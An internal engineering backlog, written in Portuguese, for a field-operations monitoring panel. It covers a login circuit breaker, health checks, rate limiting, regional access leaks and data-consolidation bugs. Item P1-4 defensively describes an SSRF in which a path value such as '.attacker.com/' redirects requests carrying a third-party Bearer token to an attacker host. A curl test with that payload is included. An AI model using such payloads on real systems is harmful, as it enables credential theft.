- **Sintoma:** admin (3 regionais) só via Guarapari na Histórico; nas outras abas
  via todas. Gerou dúvida sobre acesso das outras contas — daí a investigação que
  achou o **P1-18**.
- **Causa:** a trava da regional na init lazy da Histórico testava
  `currentRegional` (o FILTRO corrente, mutável) em vez de `userRegionals` (o
  ESCOPO do JWT, imutável). Sequência: admin com Guarapari selecionado noutra aba
  → `currentRegional='GUA'` → 1ª abertura da Histórico dispara a trava e
  DESABILITA o dropdown; a init roda 1x e o `setDisabled(true)` nunca era desfeito.
  A Gráficos nunca sofreu porque testava `sess.regional`, ausente no token v2.
- **Fix:** travar só quando `userRegionals.length === 1` (conta de 1 regional).
  Multi-regional com subconjunto selecionado: reflete a seleção, mas DESTRAVADO.
  Verificado nos 6 perfis (admin todas/1/2, user GUA, user ES todas/subset).
- **Segurança:** nenhuma — o backend enforce escopo por conta, e o bug
  restringia (mostrava MENOS), o oposto de vazar.
- **Esforço:** 30min (feito). **Relacionado:** P1-18 (achado na mesma trilha).

---

## P1-20 — Login WPA sem circuit breaker trava a conta na EDP

- **Categoria:** Ops / Backend (continuidade da ingestão)
- **Status:** **código done** (13/08/2026) — falta só o deploy e a ação humana da senha
- **Incidente (13/08/2026):** entre 17:45 e 18:00 a senha da conta WPA `sp` parou
  de ser aceita ("Usuário ou senha inválidos" — a EDP rotacionou a senha). O
  sistema seguiu pedindo token a cada trigger (snapshot 15/15min + notas + teams);
  **cada um faz 1 login real** e, em 5 tentativas, a EDP **bloqueou a conta até
  03:30**. Coleta parada das 18h até intervenção.
- **Diagnóstico:** o `login()` (`services/wpaService.js:202`) já NÃO faz retry em
  credencial inválida (só em erro transiente de rede/Azure) — então não são 5
  tentativas numa chamada. As 5 vêm de **chamadores independentes** que não
  compartilham o conhecimento "o último login falhou por senha". Cada um reaprende
  do zero e gasta uma tentativa do orçamento da EDP.
- **✅ IMPLEMENTADO (13/08/2026) — breaker por conta em `login()`** (`services/
  wpaService.js`; `login()` é o choke point de `getToken`, `forceRefresh` e o cron
  de token, então cobre tudo):
  - `_classifyLoginError(msg)` — `invalid_credential` / `account_locked` / `other`.
  - `_computeUnlockUntil(msg, nowMs)` — parseia "aguarde até HH:MM" e devolve a
    PRÓXIMA ocorrência em BRT (+2min de margem). Puro, `nowMs` injetável.
  - `_breaker` (Map por conta) com `until`; `login()` no topo rejeita sem tocar no
    `/signin` enquanto vigente (`err.isBreakerOpen`).
  - cooldown: `account_locked` → até o horário do desbloqueio; `invalid_credential`
    → longo (12h, `WPA_INVALID_CRED_COOLDOWN_MIN`) porque não se cura sozinho — só
    troca de `.env` + restart, e o restart zera o breaker (é em memória).
  - reseta em: login OK (`_clearBreaker`), restart, ou fim do `until`.
  - erro transiente (rede/Azure cold-start) **não** abre o breaker — o retry curto
    do cold-start segue funcionando.
  - `test/loginBreaker.test.js` (13 casos): classificação, parse do horário
    (18:30→03:32 e "já passou→amanhã"), abrir/expirar, isolamento por conta, e
    `login()` rejeitando sem rede. Suíte 366 → 379.
- **Efeito:** senha errada continua parando a coleta (inevitável), mas a conta
  **não trava** → corrigir `.env` + `pm2 restart` recupera na hora, sem esperar a
  janela de bloqueio da EDP.
- **Ação humana (fora do código):** quando a EDP rotacionar a senha, atualizar o
  `.env` (`SP_PASS`/equivalente) ANTES do próximo ciclo e reiniciar. ⚠️ Se o `.env`
  seguir errado após o desbloqueio, re-trava na 1ª rodada.
- **Relacionado:** P1-1 (watchdog — deveria ter alertado o bloqueio em tempo real),
  P1-3 (`snapshot_last_ok`/`snapshot_error` já registram, mas ninguém é avisado).
- **Esforço:** ~2-3h com testes.

---

## P1-1 — Alerta ativo (watchdog + Teams webhook)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de operação 2026-07-08 (já ocorreu incidente de 3h
  sem detecção).
- **Evidência:** Grep por `alert|smtp|nodemailer|notify|watchdog` em
  `services/`: zero resultados. `/api/admin/health` expõe `last_snapshot.ageMinutes`
  mas nada o consome automaticamente.
- **Impacto:** Cron parou 3h uma vez sem ninguém saber. Cada janela de
  ~15min sem coleta = buraco permanente no histórico.
- **Ação:**
  1. Criar Incoming Webhook no Teams (canal operacional da Engelmig ou
     canal privado do José pra começar).
  2. Escrever `scripts/watchdog.sh` (~30 linhas): `curl` no
     `/api/admin/health`, se `ageMinutes > 45` na janela 06-20h BRT ou HTTP
     != 200, `curl` no webhook Teams com payload de alerta.
  3. Adicionar ao `crontab -e` do `usr_jose`: `*/15 * * * * ~/prod-stc/scripts/watchdog.sh`.
- **Aceite:**
  - [ ] Webhook Teams recebe teste manual (curl com payload dummy).
  - [ ] `watchdog.sh` roda sem erro e não alerta se sistema saudável.
  - [ ] Simulação: parar PM2 por 50min em horário útil → alerta chega
    no Teams em até 15min.
  - [ ] Documentado no `RUNBOOK.md`.
- **Esforço:** meio dia.
- **Rollback:** `crontab -r` remove o watchdog. Sem efeito no sistema.
- **Depende de:** P1-2 (`/health` real).

## P1-2 — `/health` real (mover antes do catch-all + SELECT 1)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de operação + backend 2026-07-08
- **Evidência:** `server.js:75-78` registra `app.get('*')` que responde
  `index.html` pra qualquer path não-`/api`. `server.js:79` registra
  `app.get('/health')` **depois** — Express casa por ordem, então `/health`
  devolve HTML 200 sempre. Nunca o JSON esperado.
- **Impacto:** Qualquer monitor externo (P1-1, uptime check) que aponte
  pra `/health` sempre vê 200, mesmo com Postgres caído ou cron morto.
  Monitoria vira placebo.
- **Ação:**
  1. Mover `app.get('/health')` pra **antes** do `express.static` e do
     `app.get('*')`.
  2. Fazer o handler executar `SELECT 1` no pool + ler idade do último
     snapshot em `snapshots` (max(captured_at)).
  3. Retornar 503 se: SELECT 1 falhar OU `ageMinutes > 30` em horário 06-20h.
     Retornar 200 com JSON `{ok:true, db:'ok', last_snapshot_min: N}`
     caso contrário.
- **Aceite:**
  - [ ] `curl -sS http://localhost:3002/health` retorna JSON válido, não HTML.
  - [ ] Com Postgres parado (`pg_ctl stop` ou docker stop), retorna 503.
  - [ ] Documentado em `RUNBOOK.md`.
- **Esforço:** 30min.
- **Rollback:** Trivial (reverter ordem).
- **Depende de:** nada.

## P1-3 — `snapshot_last_ok` em `app_settings`

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:** `services/cronService.js:170-171` — snapshot_failed só vira
  `log.error`, sem persistência. Só `subcat_error` tem registro em
  `app_settings` (linhas 33-49). Queda da WPA por horas é invisível.
- **Impacto:** `/admin/health` (que alimenta o P1-1) precisa saber quando
  foi o último snapshot bem-sucedido. Hoje calcula da tabela `snapshots`,
  o que é frágil (pode não representar tentativa que falhou).
- **Ação:**
  1. Replicar padrão `_recordSubcatError` (`cronService.js:33-49`) em novas
     funções `_recordSnapshotOk()` e `_recordSnapshotError()`.
  2. Chamar `_recordSnapshotOk()` ao final de `runSnapshot` bem-sucedido
     (grava timestamp).
  3. Chamar `_recordSnapshotError({at, msg})` em cada catch de `runSnapshot`.
  4. Expor em `/api/admin/health` (`routes/index.js:1242`) os campos
     `snapshot.last_ok` e `snapshot.last_error`.
- **Aceite:**
  - [ ] `SELECT data FROM app_settings WHERE key='snapshot_last_ok'` retorna
    JSON válido com `ts` recente.
  - [ ] `/api/admin/health` retorna esses campos.
  - [ ] Card no frontend Admin exibe (replicar padrão do card de
    `subcat_error` em `index.html:11754`).
- **Esforço:** 2-3h.
- **Rollback:** Trivial (funções novas não interferem em nada existente).
- **Depende de:** nada.

## P1-4 — SSRF em `/api/wpa/probe` vaza token EDP

- **Categoria:** Segurança
- **Status:** pending
- **Fonte:** Auditoria de segurança 2026-07-08
- **Evidência:** `routes/index.js:905-908` — `const path = req.query.path || ...; const wpaRes = await wpaFetch(path);`
  sem validação. `services/wpaService.js:340-347` — `wpaFetch` faz
  `fetch(WPA_API + path, { Authorization: 'Bearer ' + token })`.
  Concatenação de string permite `?path=.attacker.com/` → destino vira
  `https://edp-wpa-web-api.azurewebsites.net.attacker.com/` com Bearer
  token da EDP anexado.
- **Impacto:** Qualquer usuário autenticado (dos 5) pode exfiltrar o token
  da EDP pra host controlado. Combinado com brute force de login (P1-5),
  qualquer atacante interno pode fazer isso. Token EDP é credencial de
  terceiro — vazamento pode encerrar contrato.
- **Ação:**
  1. Em `routes/index.js:905`, adicionar validação:
     ```js
     const path = req.query.path || '';
     if (!/^\/api\/[a-zA-Z0-9/_?=&%,-]*$/.test(path)) {
       return res.status(400).json({ error: 'path inválido' });
     }
     ```
  2. Aplicar mesma validação nas rotas `/api/debug/*` que repassam
     `sectorId` cru (linhas 925-1213).
  3. Considerar isolar todas as rotas de debug atrás de env `DEBUG_ROUTES=1`
     (não montar em produção).
- **Aceite:**
  - [ ] Teste manual: `curl "/api/wpa/probe?path=.attacker.com/"` retorna 400.
  - [ ] Teste manual: `curl "/api/wpa/probe?path=/api/teamsstatus/V2"` continua
    funcionando (200 com dados da EDP).
  - [ ] Grep confirma que nenhuma outra rota concatena `req.query.*` em
    URL sem validação: `grep -n "wpaFetch(.*req\.query" routes/`
- **Esforço:** 30min-1h.
- **Rollback:** Reverter o commit. Vulnerabilidade volta.
- **Depende de:** nada.

## P1-5 — Rate limit em `/auth/login` + scrypt

- **Categoria:** Segurança
- **Status:** CÓDIGO done (fa62e12, 08/07) — **falta só a migração operacional do
  `.env` de produção** (passo 6 abaixo). Rate limit, scrypt, compat retroativa e
  o script `rehash-users.js` já estão no ar. Enquanto o `.env` não migra, a
  produção segue em SHA-256 legado (login funciona pelos dois formatos; o boot
  loga o aviso `AUTH_USERS usa hash SHA-256 legado`). Verificado em 14/07: os 4
  testes de login/rate-limit passam (test/routes.test.js), incluindo o 429 na
  11ª tentativa.
- **Fonte:** Auditoria de segurança 2026-07-08
- **Evidência:** `routes/index.js:34-51` rota de login sem limitador.
  `server.js:15-18` nenhum middleware de rate limit. `middleware/auth.js:97-108`
  usa `sha256` puro sem salt.
- **Impacto:** Painel escuta em todas as interfaces (`server.js:91` sem
  host). Rede 172.25.x tem qualquer máquina alcançando `/auth/login` sem
  throttle. 5 contas, brute force ilimitado. Se `AUTH_USERS` vazar por
  qualquer canal, SHA-256 sem salt cai em segundos com rainbow table.
- **Ação:**
  1. Adicionar limitador em memória em `routes/index.js:34`:
     `const _loginAttempts = new Map();` — chave `${ip}:${username}`,
     valor `{count, firstAt}`. Regra: >10 tentativas em 5min → 429 com
     `Retry-After: 300`.
  2. **Trocar `sha256` por `scrypt`** em `middleware/auth.js:97-108`. `scrypt`
     é nativo em `crypto` (sem dependência nova). Salt por usuário.
  3. Formato novo do `AUTH_USERS`:
     `user:scrypt$salt$hash:role:regional1|regional2` (novo prefixo `scrypt$`
     no campo hash).
  4. Manter compat retroativa por 1 release: se hash começa com `scrypt$`,
     valida com scrypt; caso contrário, tenta SHA-256 (legacy). Logar
     warning quando cair no legacy.
  5. Script `scripts/rehash-users.js` que lê AUTH_USERS atual e imprime
     versão com scrypt (dev roda uma vez, cola no .env).
  6. **[PENDENTE — único passo que falta]** Migrar o `.env` de produção na VM:
     precisa das senhas em texto (estão no cofre — ver P0-1). Procedimento:
     `cd ~/prod-stc && node scripts/rehash-users.js` (modo interativo pergunta
     a senha de cada user e imprime a linha `AUTH_USERS=` em scrypt) → colar no
     `.env` → `pm2 delete wpa-monitor && pm2 start ecosystem.config.js &&
     pm2 save` → testar login de sjc/guarapari/cachoeiro/admin. Guardar backup
     da linha antiga antes (rollback = colar de volta; SHA-256 ainda valida).
- **Aceite:**
  - [x] 11 tentativas de login errado no mesmo user em 1min retornam 429.
  - [x] Login válido continua funcionando.
  - [x] Novo formato scrypt validado em `test/auth.test.js`.
  - [x] Compat retroativa: hash SHA-256 antigo ainda valida com warn.
  - [ ] `.env` da produção migrado pro formato novo. **← só isto falta**
- **Esforço:** meio dia (código feito; resta ~15min de migração operacional).
- **Rollback:** Reverter o commit. `.env` volta ao formato antigo (guardar
  backup do `.env` no cofre P0-1 antes de mudar).
- **Depende de:** P0-1 (cofre pra backup do `.env`).

## P1-6 — Git hook `pre-push` roda `node --test`

- **Categoria:** Qualidade
- **Status:** pending
- **Fonte:** Auditoria de qualidade 2026-07-08 (suíte quebrada 4 semanas
  sem ninguém notar).
- **Evidência:** `.github/` não existe (sem CI). `package.json:10` só tem
  `"test": "node --test"`. Ninguém força a rodar.
- **Impacto:** Suíte de 152 testes é rede de segurança inútil se ficar
  vermelha sem alerta. Já aconteceu em 2026.
- **Ação:**
  1. Criar `.git/hooks/pre-push` (script bash):
     ```bash
     #!/bin/bash
     echo "🧪 Rodando node --test antes do push..."
     if ! node --test; then
       echo "❌ Testes falharam. Push abortado. Corrija ou use 'git push --no-verify'."
       exit 1
     fi
     ```
  2. `chmod +x .git/hooks/pre-push`.
  3. Como hooks locais não são versionados por padrão, adicionar
     `scripts/install-hooks.sh` que copia de `hooks/pre-push` (versionado)
     pra `.git/hooks/pre-push`. Documentar em CLAUDE.md que novo dev roda
     esse script após clone.
- **Aceite:**
  - [ ] `hooks/pre-push` existe no repo (versionado).
  - [ ] `scripts/install-hooks.sh` instala corretamente.
  - [ ] Simulação: `git push` com teste quebrado → aborta com mensagem.
  - [ ] Documentado em `CLAUDE.md`.
- **Esforço:** 30min.
- **Rollback:** `rm .git/hooks/pre-push` — desliga sem afetar mais nada.
- **Depende de:** nada.

## P1-7 — Retry natural pra MD/SF/rejeições

- **Categoria:** Dados / Pipeline
- **Status:** pending
- **Fonte:** Auditoria de pipeline 2026-07-08
- **Evidência:**
  - `services/classifierService.js:40-46` — `safeJson` engole erro e retorna
    `null`. `:89-96` — `md=null` → grava `OUTROS` no cache.
  - `services/rejectionService.js:226-233` — `all_failed` retorna struct
    com `motivo_codes=[]` em vez de null. `services/cronService.js:439-445`
    — filtro `jaCacheadas` nunca retenta note_id já gravado.
- **Impacto:** Erro transiente da WPA (timeout, cold-start Azure) vira
  classificação errada **permanente**. Só DD tem retry (`cronService.js:642`).
  MD/SF/rejeições degradam KPIs de subcategoria a cada instabilidade EDP.
- **Ação:**
  1. Em `classifierService.js:classificarMD` e `classificarSF`: quando
     `md/sf === null` (distinto de "respondeu sem Code"), retornar `null`
     em vez do struct com sub_code='OUTROS'.
  2. No caller (`upsertSubcatTotals` em `dataWriter.js`), pular UUIDs
     com `null` — não adicionar ao cache. Próximo ciclo pega de graça
     porque `note_id` continua fora de `getClassifiedIds`.
  3. Em `rejectionService.js:runClassifyRejections`, não gravar linhas com
     `endpoint_missing` ou `all_failed=true`. Retornar `null` do processor,
     caller pula.
  4. Adicionar métrica no `/admin/health`: contador de UUIDs pendentes
     (não classificados) — se crescer descontroladamente, alerta.
- **Aceite:**
  - [ ] Simulação: mockar `wpaFetch` retornando erro por 1 ciclo. UUIDs
    daquele ciclo NÃO devem entrar em `note_subcategorias`.
  - [ ] Ciclo seguinte com WPA respondendo normalmente: UUIDs pegos e
    classificados corretamente.
  - [ ] `/admin/health` mostra contador de pendentes.
- **Esforço:** 3-4h.
- **Rollback:** Reverter o commit. Volta ao comportamento anterior.
- **Depende de:** nada.

## P1-8 — `consolidateDay` transacional (parte de P0-3)

Ver P0-3. Este item é a parte de refactor de código do fix — pode ser
feita em PR separado depois dos testes.

## P1-9 — Vendorizar Leaflet + fonte Roboto

- **Categoria:** Frontend
- **Status:** pending
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** `index.html:16-19` — `unpkg.com/leaflet@1.9.4` e
  `leaflet-polylinedecorator`. `index.html:8-9` — `fonts.googleapis.com`.
  Enquanto o comentário em `index.html:10-13` documenta que
  `cdn.sheetjs.com` foi bloqueado pelo Fortinet e quebrou tudo.
- **Impacto:** Próxima política restritiva do Fortinet mata as abas Mapa
  e Deslocamentos com `L is not defined`. Sem deploy, sem aviso, sem forma
  de diagnóstico até alguém abrir F12.
- **Ação:**
  1. `curl` os arquivos pra `vendor/`:
     - `vendor/leaflet-1.9.4.js`
     - `vendor/leaflet-1.9.4.css`
     - `vendor/leaflet-images/` (marker icons)
     - `vendor/leaflet-polylinedecorator.js`
     - `vendor/roboto/*.woff2` (weights 400/500/700)
  2. Atualizar `<link>` e `<script>` em `index.html` pra apontar pra
     `vendor/`.
  3. Adicionar `@font-face` em CSS pra Roboto local.
  4. Testar aba Mapa e Deslocamentos em produção com Fortinet ativo.
- **Aceite:**
  - [ ] Sem requests pra `unpkg.com` ou `fonts.googleapis.com` (F12 → Network).
  - [ ] Mapa desenha, rota traça, marcadores aparecem.
  - [ ] Fonte Roboto carrega (visualmente indistinguível).
- **Esforço:** 1h.
- **Rollback:** Reverter commit. Volta pra CDN.
- **Depende de:** nada.

## P1-10 — Remover vazamento de stack trace ao cliente

- **Categoria:** Segurança
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:879` — `stack: err.stack?.split('\n').slice(0,3).join(' | ')`
  no JSON de resposta 500. Expõe estrutura interna, nomes de arquivos,
  linha de código.
- **Impacto:** Baixo mas real. Facilita reconnaissance pra atacante interno.
- **Ação:** Remover o campo `stack` do JSON de resposta. Manter no log
  do servidor (`log.error` com `err.stack` completo).
- **Aceite:**
  - [ ] `curl` numa rota que gera erro não retorna campo `stack` no JSON.
  - [ ] `pm2 logs` ainda mostra stack completo.
- **Esforço:** 5min.
- **Rollback:** Trivial.
- **Depende de:** nada.

## P1-11 — `consolidateDay` transacional (rebaixado de P0-3)

- **Categoria:** Dados
- **Status:** pending
- **Fonte:** Auditoria de dados + pipeline 2026-07-08; rebaixado de P0-3 em 08/07.
- **Evidência:** `services/dataWriter.js:consolidateDay` faz `DELETE` de
  `team_daily_totals` e `team_daily_subcat_totals` (datas d-1, d) seguido de
  reagregação via `upsertTeamDailyTotals`/`upsertSubcatTotals`, **sem
  transação**. Crash entre o DELETE e o INSERT zera o(s) dia(s).
- **Impacto:** Janela de crash zera dados que alimentam o contrato EDP.
  **Já mitigado parcialmente** pelo drift-sweep D-1..D-7 (commit `f8b839b`):
  um dia zerado por crash é detectado e re-consolidado até as 02:00 seguintes.
  A janela de exposição caiu de "indefinida" pra "algumas horas". Por isso
  saiu de P0 pra P1.
- **Por que NÃO foi feito junto com P0-3:** reescrever o coração da
  consolidação (que gera os números do contrato) **sem staging** tem risco
  maior de introduzir um bug de corrupção silenciosa do que a rara janela de
  crash que fecha. Deve ser feito com rede de segurança adequada.
- **Ação (quando houver staging ou janela supervisionada):**
  1. Extrair `_computeSubcatRows(teams)` de `upsertSubcatTotals` (separar o
     fetch de `note_subcategorias` + agregação da gravação — espelhar o que
     já foi feito com `_aggregateTeamDailyTotals`).
  2. No `consolidateDay`: computar `totalRows` (puro) e `subcatRows` (async,
     leitura) ANTES de tocar as tabelas.
  3. Abrir client dedicado via `pgShim._getPool().connect()`:
     `BEGIN` → `DELETE` das datas que efetivamente serão escritas (derivar
     das rows, não fixo [d-1,d], pra não zerar dia sem dados) → `INSERT` das
     rows → `COMMIT`. `ROLLBACK` em qualquer erro.
  4. Teste: `test/consolidate.test.js` com pool fake que lança erro no meio
     (após DELETE, antes do INSERT) e verifica que os dados antigos
     permanecem (ROLLBACK funcionou).
- **Aceite:**
  - [ ] `consolidateDay` usa transação real (BEGIN/COMMIT/ROLLBACK).
  - [ ] Teste de crash-no-meio prova que ROLLBACK preserva dados.
  - [ ] Validado em staging antes de prod.
  - [ ] Deploy com tag de rollback + validação de drift pós-deploy.
- **Esforço:** 1-2 dias (com staging).
- **Rollback:** Reverter o commit. `consolidateDay` volta ao não-atômico
  (coberto pelo drift-sweep).
- **Depende de:** staging (idealmente) ou janela de manutenção supervisionada.

---

## P1-12 — Vazamento regional em 7 rotas que ignoravam `req.scope.regionals`

- **Status:** **done** (14/07/2026)
- **Categoria:** Segurança
- **Reportado por:** José Zouain (14/07/2026): "revisar a parte de acesso de
  cada usuário: sjc, guarapari e cachoeiro". Auditoria rota-a-rota do escopo.
- **Evidência (código à época):** `applyScope`/`requireAdmin` são globais
  (`routes/index.js:92-98`) e populam `req.scope.regionals` (interseção
  `?regionals` × token). Mas 7 rotas **não usavam** `req.scope`, devolvendo
  dados de TODAS as regionais a qualquer usuário logado:
  1. `GET /metas` → `db/queries.js getMetas()` sem filtro.
  2. `GET /metas/calculadas` → `getMetasCalculadas` iterava `['GUA','CAC','SJC']`
     hardcoded (metas + progresso de todas).
  3. `GET /historico/mes` → `getMonthTotals(ym)` sem filtro (totais mensais
     reportados à EDP, todas as regionais).
  4. `GET /historico/diario` → `getDailyHistory(ym)` sem filtro.
  5. `GET /notas/kpis|serie|serie-horaria|por-equipe` → helper `_regionais(req)`
     lia `req.query.regionais` CRU (validava só contra `_REG_VALIDAS`, nunca
     contra o token). Sem param → `null` = "todas" na query. Um user GUA podia
     passar `?regionais=SJC` e ver SJC.
  6. `GET /notas/equipe/:nome` → `getNotasDeEquipe(nome)` sem regional nenhuma.
  7. `GET /teams/:teamId` → `getTeamDetail` (`services/dataService.js:495`)
     varria TODOS os setores casando por id/sigla/nome, sem checar regional —
     expunha notas + colaboradores (ângulo LGPD) de equipe de qualquer regional.
  Contraste que prova ser descuido, não design: `/historico/subcats/*`,
  `/deslocamentos/*`, `/rejeicoes/*`, `/carteira/equipes`, `/totais/*`,
  `/ranking/equipes` TODOS já usavam `req.scope.regionals` corretamente, e
  `db/queries.js` já tinha o padrão `_assertRegionals` + `inRegionals`.
- **Impacto:** leitura cross-regional (não corrompe/grava dado). Viola o
  isolamento regional que P0-4/P0-5/#28 estabeleceram. Decisão do usuário
  (14/07): metas também são confidenciais por regional → escopar tudo.
- **Ação (feita):**
  1. `_regionais(req)` passou a derivar de `req.scope.regionals` (autoritativo),
     nunca mais de `req.query` cru.
  2. `getMetas`, `getMonthTotals`, `getDailyHistory`, `getMetasCalculadas`
     (`db/queries.js`) e `getNotasDeEquipe` (`db/notasQueries.js`) ganharam
     param `regionals` opcional + filtro `inRegionals`/`_regionalParam` +
     defesa em profundidade (descarta linha fora do escopo).
  3. Rotas passam `req.scope.regionals`; `GET`/`POST /metas` respondem escopado
     (admin recebe todas; regional só as suas — inclusive no corpo do POST e no
     fallback `_metasMemory` via `_scopeMetasMemory`).
  4. `GET /teams/:teamId`: 404 (não 403, pra não revelar existência) quando a
     regional da equipe está fora do escopo do user não-admin.
- **Aceite:** ✅ suíte 200/200; ✅ teste novo: `guarapari` pedindo
  `?regionals=SJC` → 403 (applyScope zera interseção); ✅ `GET /metas` de
  `guarapari` devolve só GUA, admin devolve as 3, admin `?regionals=SJC`
  recorta pra SJC. Cobertura 200-path das rotas DB-dependentes fica pro P2-1
  (harness roda sem Postgres).
- **Rollback:** `git revert <hash>`.
- **Nota:** os 3 usuários citados (sjc/guarapari/cachoeiro) presumem-se
  `role=user` com 1 regional cada (SJC/GUA/CAC). Se algum for admin, vê tudo
  por design — checar `AUTH_USERS` no `.env`.

## P1-13 — `_acc` em memória não sobrevive a restart → produção subnotifica em dia de deploy

- **Categoria:** Dados (afeta produção reportada à EDP)
- **Status:** **CÓDIGO done** (22/07/2026) — 2 frentes: (1) `_acc` upgrade de estado
  (commit 47c68cc, P3-11) corrige o AO VIVO daqui pra frente; (2) `consolidateDay`
  agora agrega da UNIÃO de todos os snapshots do dia via `_unionTeamsFromSnapshots`
  (função pura, `test/unionSnapshots.test.js`, 8 testes) — recupera concluídas
  rotacionadas/perdidas. **MEDIÇÃO do contrato (22/07, dry-run união, 75 dias
  09/05→22/07):** recuperável TOTAL só +7% (45.394→48.613). CONCENTRADO EM JULHO:
  mai +4%, jun −1% (ok — NÃO tocar), **jul +21% (+2.877 OS)** = mês dos deploys
  pesados (restarts zeraram o _acc). Hoje 22/07 (código novo o dia todo) deu Δ≈0 =
  fix validado. **RE-CONSOLIDAÇÃO HISTÓRICA: NÃO APLICADA (decisão 22/07).** O
  check do outlier 07-16 mostrou que os números NÃO reconciliam com confiança:
  concluídas brutas subiram a 2171 (17h), caíram pra ~1493 e ficaram (provável
  restart+poda no código antigo); armazenado=623, união=1105, último-bruto=1493,
  pico=2171 — filtros entrelaçados (oficial/rejeitadas/_notaDate/augmentado) impedem
  um modelo fechado do passado. Aplicar um "+21%" não reconciliado violaria "zero
  manipulação de números" (CLAUDE.md regra 7); e subnotificar é o erro SEGURO p/
  empreiteira. Portanto: histórico fica como está; código protege daqui pra frente.
  Retomar SÓ se houver reconciliação por-nota (raw × união × stored com todos os
  filtros explícitos) que dê confiança — investigação maior, não trivial.
- **Fonte:** Investigação do EPJAC34 na auditoria de 22/07/2026.
- **Evidência:** EPJAC34 (1 sessão, sem relogin) teve **13 concluídas distintas**
  ao longo dos snapshots do dia, mas o **último snapshot só tinha 5**. Como os
  snapshots são `_acc`-augmentados (`getTeamsBySector` retorna `augmented` de
  `_accApply`, wpaService.js:1220-1225; `saveSnapshot(teams)` recebe isso),
  a contagem só poderia CAIR se o `_acc` fosse zerado no meio do dia — e foi:
  fizemos ~4 `pm2 restart` (deploys) hoje. `_acc` é in-memory e **não é
  rehidratado no boot** (`_accReset` só limpa; não lê snapshots do dia).
- **Mecanismo do dano:** (1) `upsertTeamDailyTotals` grava com `upsert onConflict`
  = SUBSTITUI o count; pós-restart os ciclos gravam contagem menor e sobrescrevem
  a maior. (2) `consolidateDay` (20:30) re-agrega do ÚLTIMO snapshot por sessão —
  se diminuído por restart, subnotifica. Resultado: **todo dia com deploy mid-day
  pode reportar produção abaixo do real** (a diferença = conclusões que já haviam
  saído da janela ao vivo da WPA e só viviam no `_acc`).
- **Impacto:** MÉDIO-ALTO — number EDP-facing, mas só em dias de deploy no
  expediente; não corrompe (snapshots retidos, reconstruível). Subnotifica (nunca
  infla).
- **Ação (recomendada):** rehidratar o `_acc` no boot a partir dos snapshots de
  HOJE (reconstrói `_acc.notes` e `_acc.carteiras`), pra um restart não perder a
  acumulação do dia. Alternativa/complemento robusto: `consolidateDay` reconstruir
  concluídas/rejeitadas pela **UNIÃO de TODOS os snapshots do dia** (dedup por UUID),
  não só o último — imune a restart E à rotação do `Concluded[]` da WPA.
- **Aceite:** após restart mid-day, o snapshot seguinte mantém a contagem
  acumulada do dia (não cai); `audit-indicadores` estável antes/depois de restart;
  re-consolidação de um dia com restart conhecido recupera o número correto.
- **Esforço:** 4-6h (rehidratação) ou 3-4h (união no consolidateDay) — de
  preferência os dois.
- **Rollback:** reverter o commit.
- **⚠️ Nota:** ao implementar a UNIÃO no consolidateDay, a re-consolidação de
  julho/junho pode AUMENTAR a produção de dias que tiveram deploy (recupera
  conclusões subnotificadas). Rever com o José antes de aplicar em massa.

## P1-14 — Reconexão vira-noite parte a produção do turno em 2 dias

- **Categoria:** Dados (afeta produção reportada à EDP)
- **Status:** pending — **decisão de negócio TRAVADA** (José, 30/07/2026):
  a continuação pertence ao **DIA DO INÍCIO DO TURNO**.
- **Evidência (EPGPR30, plantão, escala 20:00–05:00, `scripts/diag-sessao-equipe`
  ou o one-liner de snapshots):**
  - Sessão A: `begin 2026-07-29T20:05` → `end 2026-07-30T01:08` · 6 concluídas ·
    gravada em `date=2026-07-29`.
  - Sessão B: `begin 2026-07-30T01:10` → `end 2026-07-30T04:00` · 3 concluídas ·
    gravada em `date=2026-07-30`.
  - Gap A→B = **2 minutos** (01:08→01:10). É UMA reconexão da mesma noite, mas
    como o `sessionBegin` da B caiu depois da meia-noite, a atribuição por data
    de início de sessão (`_sessionDate`) jogou a B (e suas 3 concluídas) pro dia
    30/07. No modal de 30/07 aparece "início 01:10" — o rabo da noite, não o
    início real (20:05). O José confirmou: é enganoso e a produção deveria ser
    de uma noite só.
- **Impacto:** produção de um turno noturno com reconexão pós-meia-noite fica
  PARTIDA entre 2 dias. Número reportável à EDP. Sistêmico p/ times noturnos
  (EP plantão, e qualquer escala que cruze 00:00) sempre que houver relogin
  depois da virada. Também confunde o operador no Monitor.
- **Ação proposta (a spec'ar — NÃO fazer edit rápido):**
  1. Regra de **linkagem de sessão**: uma sessão S_nova cujo `sessionBegin` está
     dentro de um gap curto (`RELOGIN_MAX_GAP_HORAS`, já existe em dataService)
     após o `sessionEnd` de uma S_anterior da MESMA equipe é uma **reconexão** —
     herda o dia operacional da S_anterior (mesmo cruzando a meia-noite).
  2. Aplicar a regra em: (a) `_unionTeamsFromSnapshots`/`_sessionDate` (consolidação,
     onde a produção é atribuída ao dia); (b) `_mergeSessionsBySigla` + modal
     (front, pra mostrar a noite inteira como 1 sessão com relogin, início 20:05);
     (c) garantir que o histórico de conexões do modal liste as 2 conexões.
  3. **Função pura testável** pra decisão de linkagem (gap, cross-midnight) +
     `node --test`. Reusar/estender `_resolveLogon` (hoje só same-day).
  4. **Re-consolidar** os dias afetados após o fix (move produção entre dias) —
     medir com dry-run ANTES, revisar com o José (mesma disciplina do P1-13).
- **Aceite:**
  - [ ] Caso EPGPR30 (29–30/07) volta a mostrar a noite como 1 turno (início 20:05,
    relogin 01:10) e as 3 concluídas contam em 29/07.
  - [ ] Teste puro da regra de linkagem (same-day, cross-midnight dentro/fora do gap).
  - [ ] Dry-run da re-consolidação medido e revisado antes de aplicar.
- **Esforço:** 1–2 dias (toca agregação central + re-consolidação + front + testes).
- **Rollback:** reverter commits; re-consolidar os dias de volta (dry-run guarda o antes).
- **Relacionado:** P1-13 (união), P0-6 (janela de consolidação), regra de relogin
  (`_resolveLogon`, dataService, `RELOGIN_MAX_GAP_HORAS`).

## P1-15 — Regra rejeitada>concluída aplicada de forma INCONSISTENTE

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** pending — precisa de **decisão de negócio** antes de qualquer código
- **Fonte:** conferência da planilha manual de um colaborador (L0, 01→25/07/2026).
  Ferramentas: `scripts/diag-listar-notas-subcat.js`, `diag-conferencia-subcat.js`.
